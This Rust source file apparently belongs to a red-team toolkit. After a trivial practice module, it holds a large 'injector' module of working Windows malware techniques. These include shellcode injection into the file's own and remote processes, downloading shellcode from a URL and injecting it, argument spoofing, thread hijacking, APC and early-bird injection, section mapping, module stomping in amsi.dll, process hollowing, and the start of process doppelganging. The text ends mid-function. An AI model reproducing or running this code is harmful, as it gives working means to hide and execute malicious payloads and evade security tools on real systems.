

#![allow(warnings)]

pub mod computer{
    use self::laptop::getdiscount;


    pub const TOTAL_PRICE: u32 = 1_00_000;

    // this function gets the ram size
    pub fn getramsize() -> u8{
        8 as u8
    }

    /// returns the size of harddisk in string
    pub fn getharddisksize() -> String{
        println!("discount {}",getdiscount());
        "1TB".to_string()
    }


    pub mod laptop{
        pub fn getprice() -> u64{
            use super::getramsize;
            getramsize() as u64
        }

        pub(super) fn getdiscount() -> u32{
            10000
        }

        pub mod acer{
            pub fn getprice() -> u64{
                use super::super::getramsize;
               
                getramsize() as u64
            }
        }
        

    }




}



pub mod injector {
   
    use std::f32::INFINITY;
    use ntapi::ntapi_base::CLIENT_ID;
    use ntapi::ntobapi::NtClose;
    use ntapi::ntrtl::RtlCreateEnvironment;
    use ntapi::ntrtl::RtlCreateProcessParametersEx;
    use ntapi::ntrtl::RtlCreateUserProcess;
    use ntapi::ntrtl::RtlInitUnicodeString;
    use ntapi::ntzwapi::ZwMapViewOfSection;
    use ntapi::ntzwapi::ZwUnmapViewOfSection;
    use winapi::ctypes::*;
    use winapi::shared::ktmtypes::TRANSACTION_DO_NOT_PROMOTE;
    use winapi::shared::ntstatus::STATUS_SUCCESS;
    use winapi::um::fileapi::CREATE_ALWAYS;
    use winapi::um::fileapi::CreateFileA;
    use winapi::um::fileapi::OPEN_ALWAYS;
    use winapi::um::fileapi::SetFilePointer;
    use winapi::um::fileapi::WriteFile;
    use winapi::um::handleapi::CloseHandle;
    use winapi::um::handleapi::INVALID_HANDLE_VALUE;
    use winapi::um::libloaderapi::GetModuleHandleA;
    use winapi::um::libloaderapi::GetProcAddress;
    use winapi::um::memoryapi::*;
    use winapi::um::errhandlingapi::*;
    use winapi::um::processthreadsapi::*;
    use winapi::um::synchapi::*;
    use winapi::um::winbase::CREATE_NEW_CONSOLE;
    use winapi::um::winbase::CREATE_SUSPENDED;
    use winapi::um::winbase::CreateFileTransactedA;
    use winapi::um::winnt::*;
    use winapi::um::winuser::MessageBoxA;
    use crate::peparser64::pehollow64;
    use crate::peparser64::peloader64;
    use crate::peparser64::pememoryparser64;
    use crate::peparser64::peparse64;
    use winapi::shared::guiddef::*;

    use super::winenum::*;
    use winapi::shared::ntdef::*;
    use ntapi::ntpsapi::*;
    use std::thread;
    use std::time::Duration;
    use ntapi::ntmmapi::*;
    use winapi::um::ktmw32::*;
    use ntapi::ntpebteb::*;
    use winapi::um::processenv::*;
    use ntapi::ntrtl::*;

    #[path = "../../peparser64.rs"] mod peparser64;



    /// This function injects shellcode into it's own process
    /// using VirutalAlloc, WriteProcessMemory and executing shellcode
    /// as a function.
    /// 
    /// Pass in the reference to shellcode byte array into this function.
    pub fn shellcode_inject_self(payload: &[u8]) -> Result<String,String>{
        unsafe{

            let baseaddress = VirtualAlloc(std::ptr::null_mut(), payload.len()+1, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            if baseaddress.is_null(){
                return Err(format!("VirtualAlloc failed with error: {}",GetLastError()));
            }

            let mut byteswritten = 0;
            let res = WriteProcessMemory(GetCurrentProcess(), baseaddress, payload.as_ptr() as *const c_void, payload.len(), &mut byteswritten );
            if res==0{
                VirtualFree(baseaddress, 0, MEM_RELEASE);
                return Err(format!("WriteProcessMemory failed with error: {}",GetLastError()));
            }

            let mut oldprotect = 0;
            let res = VirtualProtect(baseaddress, payload.len(), PAGE_EXECUTE_READ, &mut oldprotect);
            if res==0{
                VirtualFree(baseaddress, 0, MEM_RELEASE);
                return Err(format!("VirtualProtect failed with error: {}",GetLastError()));
            }
            
            let mut threadid = 0;
            let threadhandle = CreateThread(std::ptr::null_mut(), 0, std::mem::transmute(baseaddress),std::ptr::null_mut() , 0, &mut threadid);
            if threadhandle.is_null(){
                VirtualFree(baseaddress, 0, MEM_RELEASE);
                return Err(format!("CreateThread failed with error: {}",GetLastError()));
            }

           // std::thread::sleep(std::time::Duration::from_secs(100));
            /*let runner = std::mem::transmute::<*mut c_void,fn()>
            (baseaddress);
            runner();*/
            let res = WaitForSingleObject(threadhandle,  0xffffffff);
            /*if res==0xFFFFFFFF{
                VirtualFree(baseaddress, 0, MEM_RELEASE);
                return Err(format!("WaitForSingleObject failed with error: {}",GetLastError()));
            }*/
            //VirtualFree(baseaddress, 0, MEM_RELEASE);
            

        }
        Ok("Success".to_string())
    }



    /// This function injects shellcode into the remote process
    /// identified by the pid supplied. It uses VirtualAllocEx,
    /// WriteProcessMemory, CreateRemoteThread to inject and run
    /// the shellcode.
    /// 
    /// Pass the process id and reference to shellcode byte array.
    pub fn shellcode_inject_remote(pid:&mut u32, payload: &[u8]) -> Result<String,String> {
        unsafe{


            let prochandle = OpenProcess(PROCESS_CREATE_THREAD|PROCESS_QUERY_INFORMATION|PROCESS_VM_READ|PROCESS_VM_WRITE|PROCESS_VM_OPERATION, 0,  *pid);
            if prochandle.is_null(){
                return Err(format!("OpenProcess failed with error: {}",GetLastError()));
            }

            let remotebaseaddress = VirtualAllocEx(prochandle, std::ptr::null_mut(), payload.len(), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            if  remotebaseaddress.is_null(){
                return Err(format!("VirtualAllocEx failed with error: {}",GetLastError())); 
            }
            let mut byteswritten = 0;
            let res = WriteProcessMemory(prochandle, remotebaseaddress, payload.as_ptr() as *const c_void, payload.len(), &mut byteswritten );
            if res==0{
                VirtualFreeEx(prochandle,remotebaseaddress, 0, MEM_RELEASE);
                return Err(format!("WriteProcessMemory failed with error: {}",GetLastError()));
            }

            let mut threadid = 0;
            let threadhandle = CreateRemoteThread(prochandle, std::ptr::null_mut(), 0, std::mem::transmute(remotebaseaddress), std::ptr::null_mut(), 0, &mut threadid);
            if threadhandle.is_null(){
                VirtualFreeEx(prochandle,remotebaseaddress, 0, MEM_RELEASE);
                return Err(format!("CreateRemoteThread failed with error: {}",GetLastError()));
            }
            
            CloseHandle(prochandle);
            //WaitForSingleObject(threadhandle, 0xFFFFFFFF);
            //VirtualFreeEx(prochandle, remotebaseaddress, 0, MEM_RELEASE);
        
        Ok("success".to_string())
        }

    }




    /// This functions retrieves the shellcode located at the url parameter
    /// and injects into the remote process specified by the process id.
    /// 
    /// After fetching the content at url, it uses shellcode_inject_remote 
    /// function to inject the shellcode.
    /// 
    /// Note: the format for the shellcode.bin file should be in csharp byte array
    /// 
    /// **Eg: msfvenom -p payload -f csharp -o payload.bin**
    pub fn shellcode_inject_url(url:String, pid:&mut u32) -> Result<String,String>{

        let r = reqwest::blocking::get(url);
        let response = match r{
            Ok(resp) => resp,
            Err(e) => return Err(e.to_string())
        };
 
        let content = response.text();
        let mut payload = match content{
            Ok(respbody) => respbody,
            Err(e) => return Err(e.to_string())
        };


        let mut payload = payload.split("{").collect::<Vec<&str>>()[1]
        .split('}').collect::<Vec<&str>>()[0] . split(",").collect::<Vec<&str>>();
        
        let mut finalpayload:Vec<u8> = Vec::new();
        for i in 0..payload.len(){
            payload[i] =   payload[i].split("0x").collect::<Vec<&str>>()[1].trim();
        }

        for i in 0..payload.len(){
            use hex;
            finalpayload.push(hex::decode(payload[i]).unwrap()[0]);
        }

        shellcode_inject_remote(pid,&finalpayload[..]);

        
        Ok("success".to_string())
    }


    pub fn spoof_arguments(path: String, mut fakeargs: String,mut newargs: String) -> Result<String,String>{

        unsafe{

            if newargs.len()>fakeargs.len(){
                return Err("new arguments must be >= fake arguments".to_string());
            }

            let processpath = path + "\0";
            fakeargs = fakeargs + "\0";
            newargs = newargs+"\0";
            let mut si = std::mem::zeroed::<STARTUPINFOA>();
            si.cb = std::mem::size_of::<STARTUPINFOA>() as u32;
            let mut pi = std::mem::zeroed::<PROCESS_INFORMATION>();

            let res = CreateProcessA(processpath.as_bytes().as_ptr() as *const i8, 
            fakeargs.as_bytes().as_ptr() as *mut i8, 
            std::ptr::null_mut(), 
            std::ptr::null_mut(), 0, 
            CREATE_NEW_CONSOLE|CREATE_SUSPENDED, 
            std::ptr::null_mut(), 
            std::ptr::null_mut(), 
            &mut si, &mut pi);

            if res ==0{
                println!("CreateProcessA failed: {}",GetLastError());
                return Err((format!("CreateProcessA failed: {}",GetLastError())).to_string());
            }

            let ogparams = super::winenum::getprocessparameters(pi.hProcess).unwrap();
            println!("parameters before spoofing: {}",ogparams);

            super::winenum::writeprocessparameters(pi.hProcess, newargs);

            ResumeThread(pi.hThread);

            let ogparams = super::winenum::getprocessparameters(pi.hProcess).unwrap();
            println!("parameters after spoofing: {}",ogparams);
            
            return Err("Something went wrong".to_string());
        }


    }



    pub fn shellcode_xor(payload:&mut[u8],key:u32){
        
        let mut newpayload:Vec<u8> = vec![0;payload.len()];

        for i in 0..newpayload.len(){
            
        }


    }


    pub fn shellcode_inject_localthreadhijack(payload: &[u8]){

        unsafe{

            let mut threadid = 0;
            let threadhandle = CreateThread(std::ptr::null_mut(), 0, std::mem::transmute(0 as *mut c_void), std::ptr::null_mut(), CREATE_SUSPENDED, &mut threadid);

            if threadhandle.is_null(){
                println!("CreateThread failed: {}",GetLastError());
                return ();
            }

            let mut context = std::mem::zeroed::<MYCONTEXT>();
            context.ContextFlags = 1;

            //let mut contextbuffer: [u8;1600] = [0;1600];
            //contextbuffer[51] = 1;
            //println!("sizeof context: {}",std::mem::size_of_val(&context));

            let res = GetThreadContext(threadhandle, &mut context as *mut _ as *mut CONTEXT);
            if res==0{
                println!("GetThreadContext failed: {}",GetLastError());
                return ();
            }

            //println!("rip: {:x?}",context.Rip);

            let baseaddress = VirtualAlloc(std::ptr::null_mut (), 
        payload.len(), 
        MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE);


            if baseaddress.is_null(){
                println!("VirtualAlloc failed: {}",GetLastError());
                return ();
            }

            
            if !baseaddress.is_null(){
                let mut byteswritten = 0;
                WriteProcessMemory(GetCurrentProcess(), 
                baseaddress, 
                payload.as_ptr() as *const c_void, 
                payload.len(), &mut byteswritten);
                println!("byteswritten: {}",byteswritten);
            }

            context.Rip = baseaddress as u64;

            SetThreadContext(threadhandle, &mut context as *mut _ as *mut CONTEXT );

            ResumeThread(threadhandle);

            //TerminateThread(threadhandle, 0);


        }
    }


    pub fn process_inject(payload:&mut [u8]){
        unsafe{

            let procs = super::winenum::getprocesses().unwrap();

            for i in procs.keys(){
                if i=="Notepad.exe"{

                    println!("found notepad");
                    
                    let mut prochandle = 0 as *mut c_void;
                    let mut objattr = std::mem::zeroed::<OBJECT_ATTRIBUTES>();
                    objattr.ObjectName = std::ptr::null_mut();
                    let mut clientid = std::mem::zeroed::<CLIENT_ID>();
                    clientid.UniqueProcess = procs[i] as *mut c_void;
                    
                    let res = NtOpenProcess(&mut prochandle, 
                        GENERIC_ALL, 
                        &mut objattr, &mut clientid);

                    if res!=STATUS_SUCCESS{
                        println!("NtOpenProcess failed: {}",res);
                        std::process::exit(0);
                    }


                    let mut regionsize = payload.len();
                    let mut remotebase = 0 as *mut c_void;
                    let res = NtAllocateVirtualMemory(prochandle, 
                        &mut remotebase, 
                        0, 
                        &mut regionsize, 
                        MEM_COMMIT|MEM_RESERVE, 
                        PAGE_EXECUTE_READWRITE);
                    
                    if res!=STATUS_SUCCESS{
                            println!("NtAllocateVirtualMemory failed: {}",res);
                            NtClose(prochandle);
                            std::process::exit(0);
                    }


                    let mut byteswritten = 0;
                    let res = NtWriteVirtualMemory(prochandle, 
                        remotebase, 
                        payload.as_mut_ptr() as *mut c_void, 
                        payload.len(), 
                        &mut byteswritten);

                    if res!=STATUS_SUCCESS{
                        println!("NtWriteVirtualMemory failed: {}",res);
                        NtClose(prochandle);
                        std::process::exit(0);
                    }


                    let mut threadhandle = 0 as *mut c_void;
                    let res = NtCreateThreadEx(&mut threadhandle, 
                        PROCESS_ALL_ACCESS, 
                        std::ptr::null_mut(), 
                        prochandle, 
                        remotebase, 
                        std::ptr::null_mut(), 
                        0, 0, 0, 0, 
                        0 as *mut PS_ATTRIBUTE_LIST);
                    if res!=STATUS_SUCCESS{
                            println!("NtCreateThreadEx failed: {}",res);
                            NtClose(prochandle);
                            std::process::exit(0);
                    }
                    


                }
            }


        }
    }


    #[no_mangle]
    pub fn myapc(){
        println!("I  AM NOW RUNNING APC FUNCTION 'MYAPC' ASSIGNED IN MY QUEUE");
        unsafe{SleepEx(10000, 1);}
    }


    pub fn process_inject_apc_local(payload: &mut [u8]){
        unsafe{

            let base = VirtualAlloc(std::ptr::null_mut(), 
                payload.len(), 
                MEM_RESERVE|MEM_COMMIT, 
                PAGE_EXECUTE_READWRITE);

            let mut byteswritten = 0;
                WriteProcessMemory(GetCurrentProcess(), 
                    base, 
                    payload.as_ptr() as *const c_void, 
                    payload.len(), 
                    &mut byteswritten);
                    
            

            let mut threadid = 0;
            let threadhandle = CreateThread(std::ptr::null_mut(), 0, 
               std::mem::transmute(  
                std::mem::transmute::<fn(),*const c_void>(myapc)
                ), 
               std::ptr::null_mut(), 
               0, 
                &mut threadid);

            if threadhandle.is_null(){
                println!("CreateThread failed: {}",GetLastError());
            }
            Sleep(1000);
            QueueUserAPC(std::mem::transmute(base), threadhandle, 0);
            WaitForSingleObject(threadhandle, 0xFFFFFFFF);

            VirtualFree(base, 0, MEM_RELEASE);

        }
    }


    pub fn process_inject_apc_remote(payload: &mut [u8], pid: u32){
        unsafe{

            let prochandle = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);

            if prochandle.is_null(){
                return ();
            }

            let remotebase = VirtualAllocEx(prochandle, std::ptr::null_mut(), payload.len(), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);

            if remotebase.is_null(){
                CloseHandle(prochandle);
                return ();
            }


            let mut byteswritten = 0;
            WriteProcessMemory(prochandle, remotebase,  payload.as_ptr() as *const c_void, payload.len(), &mut byteswritten);
            if byteswritten == 0{
                VirtualFreeEx(prochandle, remotebase, 0, MEM_RELEASE);
                CloseHandle(prochandle);
                return ();
            }

            let mut threadid = 0;
            let threadhandle= CreateRemoteThread(prochandle, 
                std::ptr::null_mut(), 0, 
                std::mem::transmute(0 as *mut c_void), 
                std::ptr::null_mut(), 
                CREATE_SUSPENDED, &mut threadid);

            QueueUserAPC(std::mem::transmute(remotebase), 
                threadhandle, 0);

            ResumeThread(threadhandle);

            
        }
    }


    pub fn process_inject_earlybird(payload:&mut [u8]){
        unsafe{

            let mut procinfo = std::mem::zeroed::<PROCESS_INFORMATION>();
            let mut startupinfo = std::mem::zeroed::<STARTUPINFOA>();
            startupinfo.cb = std::mem::size_of::<STARTUPINFOA>() as u32;

            let res = CreateProcessA(
                "C:\\Windows\\System32\\calc.exe\0".as_bytes().as_ptr() as *const i8, 
                std::ptr::null_mut(), 
                std::ptr::null_mut(), 
                std::ptr::null_mut(), 
                0, 
                CREATE_SUSPENDED, 
                std::ptr::null_mut(), 
                std::ptr::null_mut(), 
                &mut startupinfo, &mut procinfo);

            if res==0{
                println!("CreateProcessA failed: {}",GetLastError());
                return ();
            }

            let prochandle = procinfo.hProcess;

            let remotebase = VirtualAllocEx(prochandle, std::ptr::null_mut(), payload.len(), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);

            if remotebase.is_null(){
                CloseHandle(prochandle);
                return ();
            }


            let mut byteswritten = 0;
            WriteProcessMemory(prochandle, remotebase,  payload.as_ptr() as *const c_void, payload.len(), &mut byteswritten);
            if byteswritten == 0{
                VirtualFreeEx(prochandle, remotebase, 0, MEM_RELEASE);
                CloseHandle(prochandle);
                return ();
            }

            /*let mut threadid = 0;
            let threadhandle= CreateRemoteThread(prochandle, 
                std::ptr::null_mut(), 0, 
                std::mem::transmute(0 as *mut c_void), 
                std::ptr::null_mut(), 
                CREATE_SUSPENDED, &mut threadid);*/

            QueueUserAPC(std::mem::transmute(remotebase), 
                procinfo.hThread, 0);

            ResumeThread( procinfo.hThread);



        }
    }


    pub fn process_inject_sectionmapping(payload: &mut [u8],pid:u32){
        unsafe{


            let mut sectionhandle = 0 as *mut c_void;
            let mut sectionsize = std::mem::zeroed::<LARGE_INTEGER>();
            sectionsize.s_mut().LowPart = 4096;

            let res = NtCreateSection(&mut sectionhandle, 
                SECTION_ALL_ACCESS, 
                std::ptr::null_mut(), 
                &mut sectionsize, 
                PAGE_EXECUTE_READWRITE, 
                SEC_COMMIT, std::ptr::null_mut());
            
            
            if res!=STATUS_SUCCESS{
                println!("NtCreateSection failed: {}",res);
                return ();
            }

            let mut localbase = 0 as *mut c_void;
            let mut remotebase = 0 as *mut c_void;

            let res = ZwMapViewOfSection(sectionhandle, 
                GetCurrentProcess(), 
                &mut localbase, 
                0, 0, 
                0 as *mut LARGE_INTEGER, 
               &mut 4096 , 
               ViewShare, 
               0, PAGE_READWRITE);
            if res!=STATUS_SUCCESS{
                println!("ZwMapViewOfSection in local mapping failed: {}",res);
                return ();
            }

            let prochandle = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);
            if prochandle.is_null(){
                println!("OpenProcess failed: {}",GetLastError());
                return ();
            }

            let res = ZwMapViewOfSection(sectionhandle, 
                prochandle, 
                &mut remotebase, 
                0, 0, 
                0 as *mut LARGE_INTEGER, 
                &mut 4096, 
                ViewShare, 
                0, PAGE_EXECUTE_READ);
            if res!=STATUS_SUCCESS{
                println!("ZwMapViewOfSection in remote mapping failed: {}",res);
                return ();
            }

            let mut byteswritten = 0;
            WriteProcessMemory(GetCurrentProcess(), 
                localbase, 
                payload.as_ptr() as *const c_void, 
                payload.len(), 
                &mut byteswritten);
        
            let mut threadid = 0;
            let threadhandle= CreateRemoteThread(prochandle, 
                std::ptr::null_mut(), 0, 
                std::mem::transmute(remotebase), 
                std::ptr::null_mut(), 
                0, &mut threadid);
    
            

        }
    }


    pub fn module_stomping(payload:&mut [u8],pid: u32){
        unsafe{

            let dllname = "C:\\Windows\\System32\\amsi.dll\0";

            let prochandle = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);

            let remotebase = VirtualAllocEx(prochandle, 
                std::ptr::null_mut(), 
                dllname.as_bytes().len(), 
                MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);

            if remotebase.is_null(){
                println!("VirtualAllocEx failed: {}",GetLastError());   
                return ();
            }

            
            let mut byteswritten = 0;
            WriteProcessMemory(prochandle, 
                remotebase, 
                dllname.as_bytes().as_ptr() as *const c_void, 
                dllname.as_bytes().len(), &mut byteswritten);


            let modulehandle = GetModuleHandleA("Kernel32.dll\0".as_bytes().as_ptr() as *const i8);
            let loadaddress = GetProcAddress(modulehandle, "LoadLibraryA\0".as_bytes().as_ptr() as *const i8);

            let mut threadid = 0;
            let threadhandle = CreateRemoteThread(prochandle, 
                std::ptr::null_mut(), 
                0, 
                std::mem::transmute(loadaddress), 
                remotebase, 0, &mut threadid);
            if threadhandle.is_null(){
                println!("CreateRemoteThread failed: {}",GetLastError());   
                return ();
            }
            

            let modules = getloadedmodules(prochandle).unwrap();


            for i in modules.keys(){
                if i=="amsi.dll"{
                    println!("{}: {}",i,modules[i]);
                    let pe = pememoryparser64::parse(prochandle, modules[i] as *mut c_void).unwrap();
                    let entrypoint = pe.getntheader().unwrap().OptionalHeader.AddressOfEntryPoint;
                    WriteProcessMemory(prochandle, 
                        (modules[i] as usize + entrypoint as usize) as *mut c_void, 
                        payload.as_ptr() as *const c_void, 
                        payload.len(), 
                    &mut byteswritten);

                    let mut threadid2 = 0;
                    let threadhandle2= CreateRemoteThread(prochandle, 
                        std::ptr::null_mut(), 0, 
                        std::mem::transmute((modules[i] as usize + entrypoint as usize) as *mut c_void), 
                        std::ptr::null_mut(), 
                        0, &mut threadid2);
                    

                }
            }

            

        }
    }


    pub fn process_inject_hollowing(payload: &mut [u8]){
        unsafe{

            let mut procinfo = std::mem::zeroed::<PROCESS_INFORMATION>();
            let mut startupinfo = std::mem::zeroed::<STARTUPINFOA>();
            startupinfo.cb = std::mem::size_of::<STARTUPINFOA>() as u32;

            let res = CreateProcessA(
                "C:\\Windows\\System32\\calc.exe\0".as_bytes().as_ptr() as *const i8, 
                std::ptr::null_mut(), 
                std::ptr::null_mut(), 
                std::ptr::null_mut(), 
                0, 
                CREATE_SUSPENDED, 
                std::ptr::null_mut(), 
                std::ptr::null_mut(), 
                &mut startupinfo, &mut procinfo);

            if res==0{
                println!("CreateProcessA failed: {}",GetLastError());
                return ();
            }


            

            let procs = getprocesses().unwrap();
            let mut procbase = 0 as u64;
            let mut prochandle = 0 as *mut c_void;
            for i in procs.keys(){
            if i == "cmd.exe"{
                prochandle = OpenProcess(PROCESS_ALL_ACCESS, 0, procs[i]);
                let mods =  getloadedmodules(prochandle).unwrap();

                for j in mods.keys(){
                    if j=="cmd.exe"{
                        println!("process base: {:x?}",mods[j]);
                        procbase = mods[j];
                    }
                }

                }
            }


            ZwUnmapViewOfSection(prochandle, procbase as *mut c_void);


            let pe = pehollow64::from_file("D:\\red teaming tools\\calc2.exe".to_string())
                .unwrap();

            
            let remotebase = VirtualAllocEx(prochandle, 
                procbase as *mut c_void, 
                pe.getsizeofimage(), 
                MEM_RESERVE|MEM_COMMIT, 
                PAGE_EXECUTE_READWRITE);

            
            pe.load(prochandle, procbase as *mut c_void);

           //let filepe = peparse64::parsefile("D:\\red teaming tools\\calc2.exe".to_string());
            

            let mut mycontext = std::mem::zeroed::<MYCONTEXT>();
            mycontext.ContextFlags = 1;

            GetThreadContext(procinfo.hThread, &mut mycontext as *mut _ as *mut CONTEXT);
            
            //mycontext.Rcx = (procbase as usize + filepe.getntheader().unwrap().OptionalHeader.AddressOfEntryPoint as usize) as u64;

            // eax for x86, rcx for x64
            mycontext.Rcx = (procbase as usize + 4000) as u64;

            SetThreadContext(procinfo.hThread, &mut mycontext as *mut _ as *mut CONTEXT);

            ResumeThread(procinfo.hThread);

          //pehollow64::from_file(value)

        }
    }


    pub fn createprocessfromsection(sectionhandle: *mut c_void,entrypoint: u32,targetpath: String){
        unsafe{

            let mut prochandle = 0 as *mut c_void;
            let ntstatus = NtCreateProcessEx(&mut prochandle, 
                PROCESS_ALL_ACCESS, 
                std::ptr::null_mut(), 
                GetCurrentProcess(), 
                4, 
                sectionhandle, 
                std::ptr::null_mut(), 
                std::ptr::null_mut(), 
                0);

            if ntstatus!=STATUS_SUCCESS{
                println!("NtCreateProcessEx failed: {}",ntstatus);
                return();
            }

            let mut buffer:Vec<u8> = vec![0;std::mem::size_of::<PROCESS_BASIC_INFORMATION>()];
            let mut returnlength = 0;
            let ntstatus = NtQueryInformationProcess(prochandle, 
                0, 
                buffer.as_mut_ptr() as *mut c_void, 
                buffer.len() as u32, &mut returnlength);

            if ntstatus!=STATUS_SUCCESS{
                println!("NtQueryInformationProcess failed: {}",ntstatus);
                return ();
            }
            

            let mut pbi = *(buffer.as_mut_ptr() as *mut PROCESS_BASIC_INFORMATION);

            println!("peb address: {:x?}",pbi.PebBaseAddress);

            let mut pebbuffer : Vec<u8> = vec![0;std::mem::size_of::<ntapi::ntpebteb::PEB>()];
            let mut bytesread = 0;
            ReadProcessMemory(prochandle, 
                pbi.PebBaseAddress as *const c_void, 
                pebbuffer.as_mut_ptr() as *mut c_void, 
                pebbuffer.len() , &mut bytesread);

            let pebstructure = *(pebbuffer.as_mut_ptr() as *mut PEB);

            println!("REMOTE PEB PROCESSPARAMETERS: {:x?}",pebstructure.ProcessParameters);


            let mut imagepathname = std::mem::zeroed::<UNICODE_STRING>();
            let mut name1 = targetpath.encode_utf16().collect::<Vec<u16>>();
            RtlInitUnicodeString(&mut imagepathname, name1.as_mut_ptr() as *mut u16);

            //println!("{:x?}: {}",imagepathname.Buffer,imagepathname.Length);
           

            let mut dlldir = std::mem::zeroed::<UNICODE_STRING>();
            let mut dlldirname = "C:\\Windows\\System32".encode_utf16().collect::<Vec<u16>>();
            RtlInitUnicodeString(&mut dlldir, dlldirname.as_mut_ptr() as *mut u16);



            let mut windowname = std::mem::zeroed::<UNICODE_STRING>();
            let mut windowname1 = "Testing Process Doppelganging".encode_utf16().collect::<Vec<u16>>();
            RtlInitUnicodeString(&mut windowname, windowname1.as_mut_ptr() as *mut u16);



            let requiredsize = GetCurrentDirectoryA(0, std::ptr::null_mut());
            println!("{}",requiredsize);
            let mut curdir:Vec<u8> = vec![0;requiredsize as usize];
            GetCurrentDirectoryA(curdir.len() as u32, curdir.as_mut_ptr() as *mut i8);
            let curdirstring = String::from_utf8_lossy(&curdir).trim_end_matches("\0").to_string();
            let mut curdirname = std::mem::zeroed::<UNICODE_STRING>();
            let mut curdirname1 = curdirstring.encode_utf16().collect::<Vec<u16>>();
            RtlInitUnicodeString(&mut curdirname, curdirname1.as_mut_ptr() as *mut u16);


            let mut env1 = 0 as *mut c_void;
            RtlCreateEnvironment(1, &mut env1);

            let mut envparams = 0 as *mut RTL_USER_PROCESS_PARAMETERS;
            let ntstatus = RtlCreateProcessParametersEx(&mut envparams, 
               &mut imagepathname , 
               &mut dlldir, 
               &mut curdirname, 
               &mut imagepathname, 
               env1, 
               &mut windowname, 
               std::ptr::null_mut(), 
               std::ptr::null_mut(), 
               std::ptr::null_mut(), 
                RTL_USER_PROC_PARAMS_NORMALIZED);   

            if ntstatus!=STATUS_SUCCESS{
                println!("RtlCreateProcessParametersEx failed: {}",ntstatus);
                return ();
            }

            let mut procparams = std::mem::zeroed::<RTL_USER_PROCESS_PARAMETERS>();
            FillStructureFromMemory(&mut procparams, envparams as *const c_void, GetCurrentProcess());


            let mut procparamsbuffer: Vec<u8> = vec![0;procparams.Length as usize];
            ReadProcessMemory(GetCurrentProcess(), 
                envparams as *const c_void , 
                procparamsbuffer.as_mut_ptr() as *mut c_void, 
                procparams.Length as usize, 
                &mut bytesread);

            let mut envbuffer: Vec<u8> = vec![0;procparams.EnvironmentSize];
            ReadProcessMemory(GetCurrentProcess(), 
                procparams.Environment as *const c_void , 
                envbuffer.as_mut_ptr() as *mut c_void, 
                envbuffer.len(), 
                &mut bytesread);

            println!("pointer envparams: {:x?}",envparams);
            println!("procparams length: {:x?}",procparams.Length);
            println!("procparams Environment: {:x?}",procparams.Environment);
            println!("procparams Environment size: {:x?}",procparams.EnvironmentSize);
           
           let mut startingptr = envparams as usize;
           let mut endingptr = envparams as usize + procparams.Length as usize;


           if procparams.Environment!=0 as *mut c_void{

                if (procparams.Environment as usize) < (envparams as usize){
                    startingptr = procparams.Environment as usize;
                }

                if (procparams.Environment as usize + (procparams.EnvironmentSize)) > (envparams as usize + procparams.Length as usize){
                    endingptr = procparams.Environment as usize + (procparams.EnvironmentSize);
                }


           }

           //let totalsizetocopy = endingptr - startingptr;
           let totalsizetocopy = (procparams.Length as usize) + (procparams.EnvironmentSize as usize);

           //println!("{:x?}",procparamsbuffer);

           /*VirtualAllocEx(prochandle, 
            envparams as *mut c_void, 
            totalsizetocopy,
            MEM_RESERVE|MEM_COMMIT , PAGE_READWRITE);
*/


           /*if (envparams as usize + procparams.Length as usize) == (procparams.Environment as usize){

            let remote1 = VirtualAllocEx(prochandle, 
                envparams as *mut c_void, 
                procparams.Length as usize, 
                MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE);

                let mut byteswritten = 0;
                WriteProcessMemory(prochandle, 
                    envparams as *mut c_void, 
                    procparamsbuffer.as_mut_ptr() as *mut c_void, 
                    procparams.Length as usize, 
                    &mut byteswritten);

                let remote2 = VirtualAllocEx(prochandle, 
                        procparams.Environment as *mut c_void, 
                        procparams.EnvironmentSize as usize, 
                        MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE);
        
                    let mut byteswritten = 0;
                    WriteProcessMemory(prochandle, 
                            procparams.Environment as *mut c_void, 
                            envbuffer.as_mut_ptr() as *mut c_void, 
                            procparams.EnvironmentSize as usize, 
                            &mut byteswritten);
           

           }*/


           let remotebase1 = VirtualAllocEx(prochandle, 
            startingptr as *mut c_void, 
            totalsizetocopy, 
            MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE);

        

            if !remotebase1.is_null(){
                let mut byteswritten = 0;
                let res = WriteProcessMemory(prochandle, 
                    envparams as *mut c_void, 
                    procparamsbuffer.as_mut_ptr() as *const c_void, 
                    procparams.Length as usize, &mut byteswritten);
            
                if res==0{
                    println!("Writing parameters failed: {}",GetLastError());
                   
                }

                    let res = WriteProcessMemory(prochandle, 
                    procparams.Environment, 
                    envbuffer.as_mut_ptr() as *const c_void, 
                    procparams.EnvironmentSize, 
                    &mut byteswritten);
                    
                    if res==0{
                        println!("Writing Environment variables failed: {}",GetLastError());
                        
                    }

            }


            // now we need to update the remote peb's process params to startingptr


            let offset1 = (& pebstructure.ProcessParameters as *const _ as *const u8).offset_from(& pebstructure as *const _ as *const u8) as usize;
            let mut byteswritten = 0;
            WriteProcessMemory(prochandle, 
                (pbi.PebBaseAddress as usize + offset1) as *mut c_void, 
                (envparams as u64).to_ne_bytes().as_ptr() as *const c_void, 
                8, &mut byteswritten);
            

            
            let mut threadhandle1 = 0 as *mut c_void;
            let ntstatus = NtCreateThreadEx(&mut threadhandle1, 
                THREAD_ALL_ACCESS, 
                std::ptr::null_mut(), 
                prochandle, 
                (pebstructure.ImageBaseAddress as usize + entrypoint as usize) as *mut c_void, 
                std::ptr::null_mut(), 
                0, 
                0, 0, 0, std::ptr::null_mut());

            if ntstatus!=STATUS_SUCCESS{
                println!("ntcreatethreadex failed: {:x?}",ntstatus);
            }

            //WaitForSingleObject(threadhandle, 0xFFFFFFFF);

            //TerminateProcess(prochandle, 0);


        }
    }

    pub fn process_inject_doppelganging(filepath: String,targetpath: String){
        unsafe{


            let transactionhandle = CreateTransaction(std::ptr::null_mut(), 
                0 as *mut GUID, 
                TRANSACTION_DO_NOT_PROMOTE, 
                0, 0, 0, 
                std::ptr::null_mut());

            if transactionhandle==INVALID_HANDLE_VALUE{
                println!("CreateTransaction failed: {}",GetLastError());
                return ();
            }


